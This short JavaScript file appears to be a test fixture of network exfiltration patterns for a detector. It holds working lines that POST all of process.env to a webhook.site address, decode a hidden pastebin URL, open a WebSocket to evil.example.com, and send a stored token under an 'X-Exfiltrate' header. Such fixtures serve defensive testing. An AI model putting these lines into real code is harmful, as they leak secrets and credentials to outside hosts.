// Test file with network exfiltration patterns

// Hardcoded IP address
const serverUrl = "http://192.168.1.100:8080/api";

// Suspicious domain
fetch("https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7", {
  method: "POST",
  body: JSON.stringify(process.env)
});

// Base64-encoded URL
const encodedUrl = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vYWJjZGVm";
const secretEndpoint = atob(encodedUrl);

// WebSocket to external endpoint
const ws = new WebSocket("wss://evil.example.com/collect");

// Suspicious HTTP patterns
fetch("/api/data", {
  method: "POST",
  headers: {
    "X-Exfiltrate": "true"
  },
  body: btoa(JSON.stringify({
    credentials: localStorage.getItem("token")
  }))
});